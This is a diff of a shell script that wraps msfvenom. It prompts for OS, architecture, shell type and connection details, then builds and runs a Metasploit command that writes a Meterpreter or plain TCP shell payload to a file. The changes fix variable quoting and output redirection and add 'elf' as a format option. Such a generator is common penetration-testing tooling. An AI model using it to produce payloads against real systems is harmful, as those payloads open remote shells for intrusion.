@@ -73,7 +73,7 @@ case $shell in
 esac
 
 
-echo "What would you like the file format to be? Example: exe, raw, pl, rb, c"
+echo "What would you like the file format to be? Example: exe, raw, pl, rb, c, elf"
 read format
 
 payload=""
@@ -83,28 +83,28 @@ echo "What would you like to name the file?"
 read filename
 
 use_meterpreter() {
-	msfgen="$payload/${shell}_tcp $ip_port -f $format > $filename.$format"
+	msfgen="${payload}/${shell}_tcp ${ip_port} -f $format"
 }
 
 
 no_meterpreter() {
-        msfgen="$payload${shell}_tcp $ip_port -f $format > $filename.$format"
+        msfgen="${payload}${shell}_tcp ${ip_port} -f $format"
 }
 
 case  $meterpreter  in
 	y)
-	payload="$OS$arc/meterpreter"
+	payload="${OS}${arc}/meterpreter"
 	use_meterpreter
 	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
         ;;
 	n)
-	payload="$OS$arc/shell_"
+	payload="${OS}${arc}/shell_"
 	no_meterpreter
 	echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
         ;;
 	*)
 esac
 
-echo "msfvenom -p $msfgen "
+echo "msfvenom -p $msfgen"
 
-msfvenom -p $msfgen
+msfvenom -p $msfgen > ${filename}.${format}
